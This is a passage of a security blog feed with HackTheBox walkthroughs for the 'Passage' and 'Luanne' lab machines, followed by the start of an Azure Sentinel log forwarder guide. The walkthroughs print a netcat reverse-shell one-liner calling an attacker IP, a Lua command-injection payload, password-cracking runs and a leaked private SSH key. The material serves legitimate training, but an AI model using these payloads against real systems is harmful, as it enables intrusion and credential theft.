Arbitrary File Upload                  | php/webapps/48458.txt CuteNews 2.1.2 - Remote Code Execution                                | php/webapps/48800.py ---------------------------------------------------------------------- --------------------------------- Shellcodes: No Results   At first execution not only got a reverse shell but also a dump of all password hashes   $ python3 48800.py               _____     __      _  __                     ___   ___  ___            / ___/_ __/ /____ / |/ /__ _    _____       |_  | &lt;  / |_  |          / /__/ // / __/ -_)    / -_) |/|/ (_-&lt;      / __/_ / / / __/           \\___/\\_,_/\\__/\\__/_/|_/\\__/|__,__/___/     /____(_)_(_)____/                                  ___  _________                                                        / _ \\/ ___/ __/                                                       / , _/ /__/ _/                                                        /_/|_|\\___/___/                                                                                                                                                                                                                                                        [-&gt;] Usage python3 expoit.py  Enter the URL&gt; http://passage.htb ================================================================ Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN ================================================================ 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1 4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88 e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca 4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc ================================================================  ============================= Registering a users ============================= [+] Registration successful with username: T6iejum4p0 and password: T6iejum4p0  ======================================================= Sending Payload ======================================================= signature_key: 93cc9868982b197fd95de590c77cf9b9-T6iejum4p0 signature_dsi: 4afbd01426014d57617027ee835dc2ad logged in user: T6iejum4p0 ============================ Dropping to a SHELL ============================  command &gt;    Cracking these hashes using john found a password atlanta1, which belongs to user paul, which I have discovered after some edits in the script to disclose this information, as seen below.   Enter the URL&gt; http://passage.htb ================================================================ Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN ================================================================ paul@passage.htb:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd   $ john -format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hashes Created directory: /home/zurc/.john Using default input encoding: UTF-8 Loaded 4 password hashes with no different salts (Raw-SHA256 [SHA256 256/256 AVX2 8x]) Warning: poor OpenMP scalability for this hash type, consider --fork=2 Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status atlanta1         (?) 1g 0:00:00:02 DONE (2021-02-25 16:02) 0.4132g/s 5926Kp/s 5926Kc/s 17794KC/s (454579)..*7¡Vamos! Use the \"--show --format=Raw-SHA256\" options to display all of the cracked passwords reliably Session completed   With the obtained RCE as www-data, sent payload and retrieved an interactive reverse shell using the payload rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f.   User flag   After running linpeas.sh found some interesting information:      This box is vulnerable to USBCreator   [+] USBCreator [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation Vulnerable!!      Besides having this vulnerability in place, when tried to exploit it like explained in this link it didn’t worked due to lack of permissions, which will probably work with another user.   www-data@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/somefilename true Error: GDBus.Error:org.freedesktop.DBus.Python.dbus.exceptions.DBusException: com.ubuntu.USBCreator.Error.NotAuthorized (According to introspection data, you need to pass 'ssb')      Noted other 2 users in this box, where these were initially listed as e-mail addresses in the page and Paul called us attention once this is a user to which we have already cracked a password.   [+] Users with console nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash root:x:0:0:root:/root:/bin/bash      Permissions for the console users, where nadav is the one that holds more privileges in the system, including being a member of sudo group.   [+] All users &amp; groups uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) uid=1001(paul) gid=1001(paul) groups=1001(paul)      First thing to test is Paul credentials, which worked successfully at first try and allowed us to get the user flag! :smile:   www-data@passage:~$ su paul Password: paul@passage:~$ cat user.txt &lt;redacted&gt; paul@passage:~$   Root flag   First thing to do with paul credentials was another attempt to exploit USBCreator vulnerability, which failed just like www-data due to insufficient privileges.   Analyzing the user’s home directory, found a RSA keypair where Paul authored it to ssh without credentials adding the public key inside authorized_keys file.   paul@passage:~/.ssh$ ls -la total 24 drwxr-xr-x  2 paul paul 4096 Jul 21  2020 . drwxr-x--- 16 paul paul 4096 Feb  5 06:30 .. -rw-r--r--  1 paul paul  395 Jul 21  2020 authorized_keys -rw-------  1 paul paul 1679 Jul 21  2020 id_rsa -rw-r--r--  1 paul paul  395 Jul 21  2020 id_rsa.pub -rw-r--r--  1 paul paul 1312 Jul 21  2020 known_hosts   Taking a closer look to id_rsa.pub, noticed that it was created by nadav. After seeing this I have immediately tried to ssh using the obtained private key as this user and luckily I had success on it! :smiley:   $ cat id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage  $ ssh -i id_rsa nadav@10.10.10.206 Last login: Thu Feb 25 13:41:27 2021 from 10.10.10.10 nadav@passage:~$ id uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)   Finally, now as nadav, gave another try to USBCreator vulnerability and this time we had success once we have all required permissions to execute it.   The USBCreator exploit allow us to get a file using root permission. If you only want to get the flag you can run the command below copying the file root.txt to the /tmp directory.   nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/somefilename true   If you want to truly get root and an interactive shell there are some possibilities that we must try:      Obtain a copy of /etc/shadow, unshadow it and crack the passwords using John or Hashcat, which didn’t worked for me with the dictionaries used;   Verify the existence of  id_rsa file inside root profile, as well as the presence of it in the authorized_keys, which was the option we had success as below and obtained the root flag:   nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/somefilename true  ## Attacker machine $ scp -i id_rsa nadav@10.10.10.206:/tmp/somefilename . $ chmod +600 id_rsa $ ssh -i root@10.10.10.206 root@passage:~# id uid=0(root) gid=0(root) groups=0(root) root@passage:~# cat /root/root.txt &lt;redacted&gt;   I hope it was somehow useful!   See you in the next post! :smile:  ","categories": ["Walkthrough"],
        "tags": ["HackTheBox","HTB Medium","HTB Linux"],
        "url": "/walkthrough/2021/03/htb-passage",
        "teaser": "https://i.imgur.com/47HPk8O.png"
      },{
        "title": "Walktrough: HTB Luanne",
        "excerpt":"Hello everyone!   The box of this week will be Luanne, another easy-rated Linux box from  Hack The Box, created by polarbearer.   :information_source: Info: Write-ups for Hack The Box are always posted as soon as machines get retired.      Enumeration   Started enumeration, as usual, by running nmapquickscan to check published services on this box:   $ nmap -sC -sV -Pn -oA quick 10.10.10.218 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 13:35 -03 Nmap scan report for 10.10.10.218 Host is up (0.15s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0) | ssh-hostkey: | 3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA) | 521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA) |_ 256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519) 80/tcp open http nginx 1.19.0 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=. | http-robots.txt: 1 disallowed entry |_/weather |_http-server-header: nginx/1.19.0 |_http-title: 401 Unauthorized 9001/tcp open http Medusa httpd 1.12 (Supervisor process manager) | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=default |_http-server-header: Medusa/1.12 |_http-title: Error response Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 208.02 seconds   80/TCP - HTTP Service   Accessing the root page of this webservice an authentication was requested, to which we still don’t have any credentials to try. Something that called attention is a link to 3000/TCP on localhost, once we’re accessing this website on 80/TCP, which shows us that this page is being published using some kind of proxy.      According to nmap scan, there’s an entry on robots.txt. Validating its contents, we found some interesting information about a virtual directory called /weather.   $ curl -L http://10.10.10.218/robots.txt User-agent: * Disallow: /weather #returning 404 but still harvesting cities   With this information we can infer that even receiving 404 accessing /weather there might be another service published inside of it, allowing us to query weather information.   Gobuster   Executing gobuster in directory mode, I was able to find the path forecast, which was key to proceed with on this machine.:   $ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.218/weather/ -o gosbuter-80-weather.txt -t 50 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.218/weather/ [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/02/19 14:50:37 Starting gobuster =============================================================== /forecast (Status: 200) Progress: 68993 / 220561 (31.28%)   In a curl request with no parameters, we receive back some “help” on how to use this API, which allows us to query weather data for specific cities.   $ curl -L http://10.10.10.218/weather/forecast {\"code\": 200, \"message\": \"No city specified. Use 'city=list' to list available cities.\"} $ curl -L http://10.10.10.218/weather/forecast?city=list {\"code\": 200,\"cities\": [\"London\",\"Manchester\",\"Birmingham\",\"Leeds\",\"Glasgow\",\"Southampton\",\"Liverpool\",\"Newcastle\",\"Nottingham\",\"Sheffield\",\"Bristol\",\"Belfast\",\"Leicester\"]}    $ curl -L http://10.10.10.218/weather/forecast?city=London {\"code\": 200,\"city\": \"London\",\"list\": [{\"date\": \"2021-02-19\",\"weather\": {\"description\": \"snowy\",\"temperature\": {\"min\": \"12\",\"max\": \"46\"},\"pressure\": \"1799\",\"humidity\": \"92\",\"wind\": {\"speed\": \"2.1975513692014\",\"degree\": \"102.76822959445\"}}},{\"date\": \"2021-02-20\",\"weather\": {\"description\": \"partially cloudy\",\"temperature\": {\"min\": \"15\",\"max\": \"43\"},\"pressure\": \"1365\",\"humidity\": \"51\",\"wind\": {\"speed\": \"4.9522297247313\",\"degree\": \"262.63571172766\"}}},{\"date\": \"2021-02-21\",\"weather\": {\"description\": \"sunny\",\"temperature\": {\"min\": \"19\",\"max\": \"30\"},\"pressure\": \"1243\",\"humidity\": \"13\",\"wind\": {\"speed\": \"1.8041767538525\",\"degree\": \"48.400944394059\"}}},{\"date\": \"2021-02-22\",\"weather\": {\"description\": \"sunny\",\"temperature\": {\"min\": \"30\",\"max\": \"34\"},\"pressure\": \"1513\",\"humidity\": \"84\",\"wind\": {\"speed\": \"2.6126398323104\",\"degree\": \"191.63755226741\"}}},{\"date\": \"2021-02-23\",\"weather\": {\"description\": \"partially cloudy\",\"temperature\": {\"min\": \"30\",\"max\": \"36\"},\"pressure\": \"1772\",\"humidity\": \"53\",\"wind\": {\"speed\": \"2.7699138359167\",\"degree\": \"104.89152945159\"}}}]}   Besides being possible to query all the information in this API, I couldn’t identify any detail that could be used to get an RCE and possibly initial access in this box.   9001/TCP - HTTP Service   Searching for Medusa httpd 1.12 (Supervisor process manager) I have found that this service could be an application called  Supervisor. Searching for its default credentials on the project page, I have found user:123, which allowed me to access the portal as below:      At first sight, we can identify the running version, which is 4.2.0, and that, unfortunately, has no known vulnerability/working PoC disclosed.   Exploring all available options, an interesting point was noted: the link processes. Once you access it all the processes in execution will be listed, but one of them have stood over the others:   _httpd 376 0.0 0.0 34956 2020 ? Is 5:56AM 0:00.13 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www   As I could understand, the API we were using being published on 80/TCP is an app developed using LUA, a programming language developed by PUC-RJ.   Initial access   Once we’re aware that this API was developed in LUA, after some research I came across this article, which describes some ways to abuse applications written in LUA using code injection and, after a few tests, I have found something that could lead us to initial access on this machine.   :bulb: Note: The secret is in the content encoding sent on the requests. The easier way I have found was to use curl with --data-urlencode, simplifying the character escaping on the request.   The final injection, which later allowed me to get an RCE is listed below:   $ curl -G --data-urlencode \"city=London') os.execute('ls -la') x=('\" http://10.10.10.218/weather/forecast {\"code\": 500,\"error\": \"unknown city: Londontotal 20 drwxr-xr-x 2 root wheel 512 Nov 25 11:27 . drwxr-xr-x 24 root wheel 512 Nov 24 09:55 .. -rw-r--r-- 1 root wheel 47 Sep 16 15:07 .htpasswd -rw-r--r-- 1 root wheel 386 Sep 17 20:56 index.html -rw-r--r-- 1 root wheel 78 Nov 25 11:38 robots.txt   From this execution I was able to read the file .htpasswd, which contains the password hash for website access, and, using john with rockyou.txt dictionary, I was able to crack the password.   $ cat .htpasswd webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0    $ john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long .htpasswd Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64]) Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status iamthebest (webapi_user) 1g 0:00:00:00 DONE (2021-02-19 17:09) 3.571g/s 10628p/s 10628c/s 10628C/s sexy..14789632 Use the \"--show\" option to display all of the cracked passwords reliably Session completed   To get an reverse shell, I have executed the following HTTP request:   curl -G --data-urlencode \"city=London') os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 1234 &gt;/tmp/f') x=('\" http://10.10.10.218/weather/forecast   User flag   Inspecting the running processes from linpeas.sh execution, observed that user r.michaels has a copy of the Lua script in execution on his profile. The idea was to get a reverse shell the same way we did at first, but the payload didn’t work. This and the path devel where this file resides indicate that this is a newer version patched for the existing vulnerability.   r.michaels 185 0.0 0.0 34992 1964 ? Is 5:56AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www   bozohttpd   A point that was being unnoticed so far is, that besides we were accessing the app on 80/TCP it was being published initially on 3000/TCP. As this implies that the app has a proxy on its publishing, inspecting the response header we have found a different server from inside the machine:   curl -I http://127.0.0.1:3000 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 199 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0 HTTP/1.1 401 Unauthorized WWW-Authenticate: Basic realm=\".\" Content-Type: text/html Content-Length: 199 Server: bozohttpd/20190228 Allow: GET, HEAD, POST   Searching for bozohttpd, the server used for this publishing, I have found its man page which describes one of its features: ~user translation, que allows us to access user’s virtual directories using requests like http://&lt;server&gt;/~&lt;username&gt;. This was confirmed by using the following curl command:   curl http://127.0.0.1:3000/~r.michaels -u webapi_user Enter host password for user 'webapi_user':iamthebest    % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 172 0 172 0 0 86000 0 --:--:-- --:--:-- --:--:-- 86000 &lt;html&gt;&lt;head&gt;&lt;title&gt;Document Moved&lt;/title&gt;&lt;/head&gt; &lt;body&gt;&lt;h1&gt;Document Moved&lt;/h1&gt; This document had moved &lt;a href=\"http://127.0.0.1:3000/~r.michaels/\"&gt;here&lt;/a&gt; &lt;/body&gt;&lt;/html&gt;   As this instance on 3000/TCP is running with _httpd account, we had not enough permissions to access r.michael’s directory but, as we noticed that there’s another instance of this app running on 3001/TCP, we could get the following result, where we can see an id_rsa file.   curl http://127.0.0.1:3001/~r.michaels/id_rsa -u webapi_user Enter host password for user 'webapi_user':iamthebest  % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 601 0 601 0 0 293k 0 --:--:-- --:--:-- --:--:-- 586k &lt;!DOCTYPE html&gt; &lt;html&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"/&gt; &lt;style type=\"text/css\"&gt; table { border-top: 1px solid black; border-bottom: 1px solid black; } th { background: aquamarine; } tr:nth-child(even) { background: lavender; } &lt;/style&gt; &lt;title&gt;Index of ~r.michaels/&lt;/title&gt;&lt;/head&gt; &lt;body&gt;&lt;h1&gt;Index of ~r.michaels/&lt;/h1&gt; &lt;table cols=3&gt; &lt;thead&gt; &lt;tr&gt;&lt;th&gt;Name&lt;th&gt;Last modified&lt;th align=right&gt;Size &lt;tbody&gt; &lt;tr&gt;&lt;td&gt;&lt;a href=\"../\"&gt;Parent Directory&lt;/a&gt;&lt;td&gt;16-Sep-2020 18:20&lt;td align=right&gt;1kB &lt;tr&gt;&lt;td&gt;&lt;a href=\"id_rsa\"&gt;id_rsa&lt;/a&gt;&lt;td&gt;16-Sep-2020 16:52&lt;td align=right&gt;3kB &lt;/table&gt; &lt;/body&gt;&lt;/html&gt;   Once we have downloaded it we noticed that it is an OpenSSH key, which could allow us to connect as r.michaels and obtain the user flag.   curl http://127.0.0.1:3001/~r.michaels/id_rsa -u webapi_user Enter host password for user 'webapi_user':iamthebest  % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 2610 100 2610 0 0 2548k 0 --:--:-- --:--:-- --:--:-- 2548k -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY-----   Validating the id_rsa file, noticed that it isn’t an RSA key but OpenSSH, where we’ll need to convert it before using it. The procedure below allowed us to complete it easily:           Remove the line break at the end of the file after -----END OPENSSH PRIVATE KEY-----.            Convert the OpenSSH to RSA using the command below, as well as the redefinition of its permissions so we could be able to use it with ssh, entering a blank password to the exported key.       chmod 600 id_rsa ssh-keygen -p -m PEM -f ./id_rsa Key has comment 'r.michaels@luanne.htb' Enter new passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved with the new passphrase.   With this key was possible to access the machine using r.michaels’ credentials and obtain the user flag.   ssh -i id_rsa r.michaels@10.10.10.218 The authenticity of host '10.10.10.218 (10.10.10.218)' can't be established. ECDSA key fingerprint is SHA256:KB1gw0t+80YeM3PEDp7AjlTqJUN+gdyWKXoCrXn7AZo. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.10.218' (ECDSA) to the list of known hosts. Last login: Sat Feb 20 07:14:11 2021 from 10.10.10.10 NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020    Welcome to NetBSD!    luanne$ id &amp;&amp; pwd &amp;&amp; ls -la uid=1000(r.michaels) gid=100(users) groups=100(users) /home/r.michaels total 52 dr-xr-x--- 7 r.michaels users 512 Sep 16 18:20 . drwxr-xr-x 3 root wheel 512 Sep 14 06:46 .. -rw-r--r-- 1 r.michaels users 1772 Feb 14 2020 .cshrc drwx------ 2 r.michaels users 512 Sep 14 17:16 .gnupg -rw-r--r-- 1 r.michaels users 431 Feb 14 2020 .login -rw-r--r-- 1 r.michaels users 265 Feb 14 2020 .logout -rw-r--r-- 1 r.michaels users 1498 Feb 14 2020 .profile -rw-r--r-- 1 r.michaels users 166 Feb 14 2020 .shrc dr-x------ 2 r.michaels users 512 Sep 16 16:51 .ssh dr-xr-xr-x 2 r.michaels users 512 Nov 24 09:26 backups dr-xr-x--- 4 r.michaels users 512 Sep 16 15:02 devel dr-x------ 2 r.michaels users 512 Sep 16 16:52 public_html -r-------- 1 r.michaels users 33 Sep 16 17:16 user.txt luanne$ cat user.txt &lt;redacted&gt;   Root flag   At r.michaels`  home directory, we have noticed a folder called backup, containing an encrypted file devel_backup-2020-09-16.tar.gz.enc. To decrypt it we’ll need a password or key, depending on the way it was initially encrypted.   Executing linpeas.sh as this user I have found some interesting information that will help us to find the path for root:      User r.michaels has doas privileges. This is equivalent to the sudo group in the other distributions that permits running tasks as root;   [+] Checking doas.conf permit r.michaels as root      This user has a PGP key stored for netpgp, that will possibly allow is to decrypt the file found on the backup folder;   [+] Do I have PGP keys? gpg Not Found /usr/bin/netpgpkeys 1 key found \"pub\" 2048/\"RSA (Encrypt or Sign)\" \"op\" 2020-09-14 Key fingerprint: \"027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a \" uid \"RSA 2048-bit key &lt;r.michaels@localhost&gt;\" \"\"      Some user-writable directories:   [+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500) [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files /home/r.michaels /tmp /var/mail /var/mail/r.michaels /var/shm /var/spool/sockets   With the information above in hand, I have started with decrypting the file using the pgp key. For this I have used one of the user-writable directories /var/shm:   luanne$ netpgp --decrypt --output=/var/shm/devel_backup-2020-09-16.tar.gz devel_backup-2020-09-16.tar.gz.enc signature 2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a uid RSA 2048-bit key &lt;r.michaels@localhost&gt;   Checking the decrypted content, we can see the files used in the API, like .htpassword, and it is also using the account webapi_user, but with a different password hash.   tree -a devel-2020-09-16 devel-2020-09-16 ├── webapi │ └── weather.lua └── www ├── .htpasswd └── index.html   Using the same method as we did earlier, I cracked it and got the password littlebear.   john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long ./www/.htpasswd Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64]) Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status littlebear (webapi_user) 1g 0:00:00:00 DONE (2021-02-20 16:02) 1.333g/s 17216p/s 17216c/s 17216C/s mirame..limewire Use the \"--show\" option to display all of the cracked passwords reliably Session completed   Just like sudo, doas requires that a password be informed where littlebear worked like a charm, allowing us to get the root flag:   doas /bin/sh Password: # hostname &amp;&amp; id luanne.htb uid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm) # cat /root/root.txt &lt;redacted&gt;   I have enjoyed a lot this box as I had no prior experience with NetBSD or FreeBSD before.   I hope you have also enjoyed it and see you again soon in the next post! :smiley:  ","categories": ["Walkthrough"],
        "tags": ["HackTheBox","HTB Easy","HTB Linux"],
        "url": "/walkthrough/2021/03/htb-luanne",
        "teaser": "https://i.imgur.com/MA88HKo.png"
      },{
        "title": "Azure Sentinel: Log Forwarder Configuration",
        "excerpt":"Often I help customers on deploying CEF/Syslog forwarders in their environments to gather data from Network Appliances and/or other servers and services into Log Analytics, which is consequently available for Azure Sentinel.   Besides having plenty documentation on how to do this deployment, as well as other community resources like Tech Community and Webinars, I have compiled all the resources I normally review with my customers during this deployment or revision in their environments.   Requirements   According to Microsoft’s official documentation, the requirement for this resource is quite simple as listed below:      4 CPUs and 8GB RAM, which is capable of handling up to 8500 EPS (events per second) using rsyslog, as stated in the docs.            If you’re deploying this infrastructure in Azure you can use the SKU Standard_F4s_v2 which is compute optimized, recommended in this case.           A Microsoft Monitoring Agent (aka omsagent) supported Linux distribution.   Python version 2.7 or 3.   One of the supported syslog daemons installed. The most common scenarios I came across uses rsyslog, once it normally is the default package for most of the distributions. Below I list the versions supported as stated in the docs:            Rsyslog v8       Syslog-ng 2.1 - 3.22.1           Forwarder Architecture      Forwarder architecture is simple:      It is composed by one or more machines receiving the logs on syslog protocol over UDP, TCP or TLS. This is done by using rsyslog or syslog-ng daemon configurations, like any standard syslog server you might be already running in your environment.   The received messages are forwarded to local listeners configured on omsagent to parse data as raw Syslog messages (UDP/25224) or CEF (TCP/25226).   Messages are sent to Log Analytics Workspace according to its configuration, making them available to Sentinel.   Now I’ll walk you through the detailed configuration of this service and sharing some tips of actions I have implemented along with some customers to mitigate some issues and reduce churn in their environment.   Design considerations   Before deploying/reviewing your forwarder infrastructure there are some questions you need to answer that will help you to properly define your configuration:      Is this forwarder handling only CEF or Syslog messages or both log types?            Besides both will be received through syslog protocol, CEF messages are parsed by omsagent according to its standard, making each field available in their own columns in Log 